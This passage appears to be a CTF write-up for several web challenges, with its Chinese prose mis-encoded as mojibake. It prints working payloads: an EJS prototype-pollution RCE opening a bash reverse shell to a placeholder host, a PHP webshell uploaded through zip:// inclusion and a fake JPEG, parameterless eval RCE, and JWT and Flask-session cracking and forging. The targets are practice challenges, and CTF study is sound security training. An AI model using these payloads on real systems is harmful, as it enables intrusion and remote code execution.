class="string">&#x27;/article/&lt;article_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">article</span>(<span class="params">article_id</span>):</span><br><span class="line">    <span class="keyword">for</span> article <span class="keyword">in</span> articles:</span><br><span class="line">        <span class="keyword">if</span> article.article_id == article_id:</span><br><span class="line">            title = article.title</span><br><span class="line">            sanitized_title = sanitize_filename(title)</span><br><span class="line">            article_path = os.path.join(ARTICLES_FOLDER, sanitized_title)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(article_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> (file):</span><br><span class="line">                content = file.read()</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;articles.html&#x27;</span>, title=sanitized_title, content=content, article_path=article_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_article</span>(<span class="params">article_id, title, content</span>):</span><br><span class="line">    sanitized_title = sanitize_filename(title)</span><br><span class="line">    article_path = ARTICLES_FOLDER + <span class="string">&#x27;/&#x27;</span> + sanitized_title</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(article_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> (file):</span><br><span class="line">        file.write(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sanitize_filename</span>(<span class="params">filename</span>):</span><br><span class="line">    sensitive_chars = [<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;.&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> sensitive_chars:</span><br><span class="line">        filename = filename.replace(char, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ç»å¯¹è·¯å¾„æ‹¼æ¥æ¼æ´ï¼š</p><blockquote><p>os.path.join(path,*paths)å‡½æ•°ç”¨äºå°†å¤šä¸ªæ–‡ä»¶è·¯å¾„è¿æ¥æˆä¸€ä¸ªç»„åˆçš„è·¯å¾„ã€‚ç¬¬ä¸€ä¸ªå‡½æ•°é€šå¸¸åŒ…å«äº†åŸºç¡€è·¯å¾„ï¼Œè€Œä¹‹åçš„æ¯ä¸ªå‚æ•°è¢«å½“ä½œç»„ä»¶æ‹¼æ¥åˆ°åŸºç¡€è·¯å¾„ä¹‹åã€‚<br>ç„¶è€Œï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸€ä¸ªå°‘æœ‰äººçŸ¥çš„ç‰¹æ€§ï¼Œå¦‚æœæ‹¼æ¥çš„æŸä¸ªè·¯å¾„ä»¥ / å¼€å¤´ï¼Œé‚£ä¹ˆåŒ…æ‹¬åŸºç¡€è·¯å¾„åœ¨å†…çš„æ‰€æœ‰å‰ç¼€è·¯å¾„éƒ½å°†è¢«åˆ é™¤ï¼Œè¯¥è·¯å¾„å°†è§†ä¸ºç»å¯¹è·¯å¾„ã€‚</p></blockquote><p><code>os.path.join(&#39;articles/&#39;,&#39;/f14444&#39;)=&#39;/f14444&#39;</code></p><p>æ•…åœ¨ <code>/upload</code> è·¯ç”±ï¼ŒPOST <code>title=/f14444&amp;content=qwe</code>ï¼Œå³å¯æ‹¿åˆ°flagã€‚</p><p>â€‹    </p><h3 id="you-konw-flask"><a href="#you-konw-flask" class="headerlink" title="you konw flask?"></a>you konw flask?</h3><blockquote><p>åœ¨é©¾æ ¡ä½ ä¸é«˜ä½å¾—å½“ä¸ªæ•™ç»ƒï¼Ÿ</p></blockquote><p>æ‰«æå‡º <code>robots.txt</code>ï¼Œæ³„éœ²ä¿¡æ¯ï¼š<code>3ysd8.html</code>ï¼Œæºç é‡Œæœ‰æ³¨é‡Šï¼š</p><p><code>&lt;!-- keyæ˜¯  app.secret_key = &#39;wanbao&#39;+base64.b64encode(str(random.randint(1, 100)).encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;)+&#39;wanbao&#39; (www,æˆ‘å¯çˆ±çš„è€å®,æˆ‘å­˜çš„å¤Ÿå®‰å…¨çš„å§) --&gt;</code></p><p>åˆ¶ä½œçˆ†ç ´secret_keyçš„å­—å…¸ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">g = <span class="built_in">open</span>(<span class="string">&#x27;dict.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    key = <span class="string">b&#x27;wanbao&#x27;</span>+base64.b64encode(<span class="built_in">str</span>(i).encode())+<span class="string">b&#x27;wanbao&#x27;</span></span><br><span class="line">    g.write(key)</span><br><span class="line">    g.write(<span class="string">b&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>çˆ†ç ´flask sessionçš„secret_keyï¼š</p><p><code>flask-unsign --unsign --cookie &#39;eyJpc19hZG1pbiI6ZmFsc2UsIm5hbWUiOiJ4eHgiLCJ1c2VyX2lkIjozfQ.ZUOYig.x1sFiE5HRT9q5bGAwSF6wMnZfOM&#39; --wordlist dict.txt</code></p><p>å¾—åˆ°secret_keyåï¼Œä¼ªé€ adminçš„flask sessionï¼š</p><p><code>flask-unsign --sign --cookie &quot;&#123;&#39;is_admin&#39;: True, &#39;name&#39;: &#39;xxx&#39;, &#39;user_id&#39;: 3&#125;&quot; --secret &#39;wanbaoNTc=wanbao&#39;</code></p><p>è¿›å…¥å­¦å‘˜ç®¡ç†é¡µé¢ï¼Œæ‰¾åˆ°flagï¼š</p><p><code>æ—¢ç„¶ä½ æ˜¯æ•™ç»ƒï¼Œé‚£è¿™ä¸ªflagå­¦å‘˜å°±äº¤ç»™ä½ å§ SYC&#123;naCcuTYu2mu0c33Fen&#125;</code></p><p>â€‹    </p><h3 id="Pupyy-rce"><a href="#Pupyy-rce" class="headerlink" title="Pupyy_rce"></a>Pupyy_rce</h3><blockquote><p>è¿™æ˜¯ä»€ä¹ˆï¼Ÿæ‰§è¡Œä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(flag.php);</span><br><span class="line"><span class="comment">//å½“å‰ç›®å½•ä¸‹æœ‰å¥½åº·çš„ğŸ˜‹</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$var</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>];</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/env|var|session|header/i&quot;</span>, <span class="variable">$var</span>,<span class="variable">$match</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$var</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&quot;WAF!!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;PLZ DONT HCAK MEğŸ˜…&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>æ— å‚æ•°RCEï¼š<code>?var=print_r(scandir(current(localeconv())));</code></p><p>å¾—åˆ°ï¼š</p><p><code>Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; error.log [3] =&gt; fl@g.php [4] =&gt; genshin01.txt [5] =&gt; index.php [6] =&gt; tiangou01.txt [7] =&gt; tiangou02.txt )</code></p><p>è®¿é—® <code>fl@g.php</code> å¾—flagã€‚</p><p>â€‹    </p><h3 id="é›¨"><a href="#é›¨" class="headerlink" title="é›¨"></a>é›¨</h3><blockquote><p>VanZYç»™ç™½æœˆå…‰å†™äº†ä¸€å¼ æ˜ä¿¡ç‰‡ï¼Œå¿«å»å¸®ä»–æŠŠidç­¾ä¸Šå§</p></blockquote><p>è®¿é—® <code>/source</code> æ²¡æƒé™ï¼Œæç¤º <code>&lt;!--Maybe you can view /hint--&gt;</code>ã€‚</p><p>è®¿é—® <code>/hint</code>ï¼Œæç¤º <code>I heard that the challenge maker likes to use his own id as secret_key</code>ã€‚</p><p>ä½¿ç”¨<a href="https://jwt.io/">jwt.io</a>è§£æjwtï¼Œè®¾ç½®secret_key=VanZYï¼Œå¾—åˆ° <code>/source</code> æºç ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt_secret = <span class="string">&quot;VanZY&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> putil_merge = <span class="built_in">require</span>(<span class="string">&quot;putil-merge&quot;</span>)</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;./views&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Super</span> = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> safecode = <span class="keyword">function</span> (<span class="params">code</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> validInput = <span class="regexp">/global|mainModule|import|constructor|read|write|_load|exec|spawnSync|stdout|eval|stdout|Function|setInterval|setTimeout|var|\+|\*/ig</span>;</span><br><span class="line">    <span class="keyword">return</span> !validInput.<span class="title function_">test</span>(code);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/code&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span> &amp;&amp; req.<span class="property">body</span>) &#123;</span><br><span class="line">    <span class="title function_">putil_merge</span>(&#123;&#125;, req.<span class="property">body</span>, &#123;<span class="attr">deep</span>:<span class="literal">true</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&quot;welcome to code&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/hint&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;I heard that the challenge maker likes to use his own id as secret_key&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/source&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line">  jwt.<span class="title function_">verify</span>(auth, jwt_secret , <span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(decoded.<span class="property">user</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname + <span class="string">&#x27;/index.js&#x27;</span>));</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;you are not admin    &lt;!--Maybe you can view /hint--&gt;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;</span><br><span class="line">      res.<span class="title function_">send</span>(<span class="string">&quot;Fuck you Hacker!!!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/create&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">body</span>.<span class="property">name</span> || req.<span class="property">body</span>.<span class="property">name</span> === <span class="literal">undefined</span> || req.<span class="property">body</span>.<span class="property">name</span> === <span class="literal">null</span>)&#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;please input name&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Super</span>[<span class="string">&#x27;userrole&#x27;</span>] === <span class="string">&#x27;Superadmin&#x27;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, req.<span class="property">body</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">safecode</span>(req.<span class="property">body</span>.<span class="property">name</span>)) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;ä½ åœ¨åšä»€ä¹ˆï¼Ÿå¿«åœä¸‹ï¼ï¼ï¼&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">name</span>: req.<span class="property">body</span>.<span class="property">name</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123;<span class="string">&#x27;user&#x27;</span>:<span class="string">&#x27;guest&#x27;</span>&#125;,jwt_secret,&#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line">    res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth &#x27;</span>,token);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;Only admin can get source in /source&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server started on port 3000&#x27;</span>));</span><br></pre></td></tr></table></figure><p>åœ¨ <code>/code</code> è·¯ç”±ä¸­ä½¿ç”¨äº† <code>putil_merge()</code> ï¼Œç»“åˆputil-mergeåŸå‹é“¾æ±¡æŸ“æ¼æ´ï¼ˆCVE-2021-23470ï¼‰ï¼Œå°† <code>Super</code> æ±¡æŸ“ï¼Œä½¿å¾— <code>/create</code> è·¯ç”±å†…çš„ <code>Super[&#39;userrole&#39;] === &#39;Superadmin&#39;</code> æˆç«‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /code</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;userrole&quot;:&quot;Superadmin&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>è¿›å…¥  <code>/create</code> è·¯ç”±å†…ï¼Œæ‰“ejs RCEï¼ˆCVE-2022-29078ï¼‰ï¼Œå‚è€ƒï¼š<a href="https://inhann.top/2023/03/26/ejs/">ejs RCE CVE-2022-29078 bypass</a>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /create HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;xxx&quot;,</span><br><span class="line">  &quot;settings&quot;:&#123;</span><br><span class="line">    &quot;view options&quot;:&#123;</span><br><span class="line">      &quot;escapeFunction&quot;:&quot;console.log;this.global.process.mainModule.require(\&quot;child_process\&quot;).execSync(\&quot;bash -c \\\&quot;bash -i &gt; /dev/tcp/x.x.x.x/7777 0&gt;&amp;1 2&gt;&amp;1\\\&quot;\&quot;);&quot;,</span><br><span class="line">      &quot;client&quot;:&quot;true&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åå¼¹shellï¼Œåœ¨VPS getshellï¼Œ<code>cat /Yupr0m1sing_f1ll4agggXD</code> å¾—åˆ°flagï¼š<code>SYC&#123;Chun_a1_M4n_NeVer_G1ve_Up&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="famale-imp-l0ve"><a href="#famale-imp-l0ve" class="headerlink" title="famale_imp_l0ve"></a>famale_imp_l0ve</h3><blockquote><p>â€é›Œå°é¬¼çœ‹äº†ä¸‹o2takuXXå¸ˆå‚…çš„é©¬å­è¯´:â€å‘~å°±..å°±æ€ä¹ˆé•¿å—ï¼ŒçœŸæ˜¯æ‚é±¼å‘¢~â¤â€,ä½ èƒ½æ¥å¸®å¸®ä»–å—ï¼Ÿ</p></blockquote><p>æ ¹æ®æºç æ³¨é‡Šï¼Œå­˜åœ¨ <code>include.php</code> æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//o2takuXXå¸ˆå‚…è¯´æœ‰é—®é¢˜ï¼Œå¿˜çœ‹äº†ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>, -<span class="number">4</span>)) == <span class="string">&quot;.jpg&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»“åˆé¦–é¡µæ–‡ä»¶ä¸Šä¼ å’Œå‹ç¼©çš„æç¤ºï¼Œè€ƒå¯Ÿzipæ–‡ä»¶åŒ…å«ã€‚</p><p>é¦–å…ˆæ–°å»ºä¸€ä¸ªzipæ–‡ä»¶ï¼Œé‡Œé¢å‹ç¼©ç€ä¸€ä¸ªä»£ç ä¸º <code>&lt;?php system($_GET[x]);</code> çš„PHPè„šæœ¬ï¼›ç„¶åæ„é€  <code>zip://php.zip#php.jpg</code>ï¼š</p><p><code>/include.php?file=zip://php.zip%23php.jpg&amp;x=cat /flag</code></p><p>å³å¯å¾—åˆ°flagã€‚</p><p>â€‹    </p><h3 id="change-it"><a href="#change-it" class="headerlink" title="change_it"></a>change_it</h3><blockquote><p>å¿«æ¥æ‰¾flagï¼ï¼ˆæ–‡ä»¶ä¸Šä¼ çš„ç›®å½•ä¸º â€œ/uploadâ€ï¼‰</p></blockquote><p>æŸ¥çœ‹æºä»£ç å¾—åˆ°ç”¨æˆ·åå¯†ç  <code>user/user</code>ï¼Œå…¶ä¸­æœ‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- ä¸€ç›´è¿ä¸ä¸Šï¼Ÿè¿ä¸ä¸Šå°±å¯¹å•¦ï¼ --&gt;</span><br><span class="line"> &lt;!-- </span><br><span class="line">   phpç‰ˆæœ¬ä¸º8.0</span><br><span class="line"> function php_mt_seed($seed)</span><br><span class="line">       &#123;</span><br><span class="line">           mt_srand($seed);</span><br><span class="line">       &#125;</span><br><span class="line">       $seed = time();</span><br><span class="line">       php_mt_seed($seed);</span><br><span class="line">       $characters = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line"></span><br><span class="line">       $newFileName = &#x27;&#x27;;</span><br><span class="line">       for ($i = 0; $i &lt; 10; $i++) &#123;</span><br><span class="line">           $newFileName .= $characters[mt_rand(0, strlen($characters) - 1)];</span><br><span class="line">       &#125;</span><br><span class="line"> </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>jwtä¼ªé€ ï¼Œçˆ†ç ´c-jwt-crackerï¼š</p><p><code>./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6InVzZXIiLCJhZG1pbiI6ImZhbHNlIn0.gzCFCz2Hw5c_EIjcM2lQ2QL3aDW3rAAHU2ZQ50_tnY4</code></p><p>å¾—åˆ° <code>Secret is &quot;yibao&quot;</code></p><p>æ„é€  <code>&#123;&quot;iss&quot;: &quot;Qingwan&quot;,&quot;name&quot;: &quot;admin&quot;,&quot;admin&quot;: &quot;true&quot;&#125;</code> å¯¹åº”çš„JWTï¼š</p><p><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOiJ0cnVlIn0.qs6tjnaghMXiTsvqEMUauz_JGzxxKdtaXPGVtQUEHek</code></p><p>æ ¹æ®å‰é¢ change.html æºç æ³„éœ²çš„ <code>php_mt_seed()</code> å‡½æ•°çŸ¥æ–‡ä»¶åé€šè¿‡éšæœºæ•°æ›´æ”¹ï¼ŒæŠ“åŒ…ï¼Œæ”¹æ–‡ä»¶åä¸º1.phpï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /change.php HTTP/1.1</span><br><span class="line">------WebKitFormBoundaryLjuFMGS9hc3RMksx</span><br><span class="line">Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ ï¼ŒåŒæ—¶çˆ†ç ´æ–‡ä»¶åï¼š<code>https://3v4l.org/UvLQQ#v8.0.30</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">php_mt_seed</span>(<span class="params"><span class="variable">$seed</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span 